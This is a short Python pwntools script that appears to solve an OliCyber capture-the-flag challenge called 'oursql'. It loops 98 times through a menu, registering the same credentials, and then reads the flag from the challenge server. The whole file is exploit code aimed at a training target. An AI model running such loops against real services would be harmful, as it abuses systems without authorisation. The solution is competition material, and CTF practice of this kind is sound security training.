#!/usr/bin/env python3
from pwn import *

r = remote("oursql.challs.olicyber.it", 21002)
def rec():
    r.recvuntil(b': ')

for i in range(98): # 100 - (first actual position - flag position)  
    r.sendline(b'1')
    rec()
    r.sendline(b'sas123sas')
    rec()
    r.sendline(b'sas123sas')
    if i != 97:
        rec()
        r.sendline(b'4')
r.recvuntil(b':\r\n')
flag = r.recvuntil(b'}').decode()
print(flag)
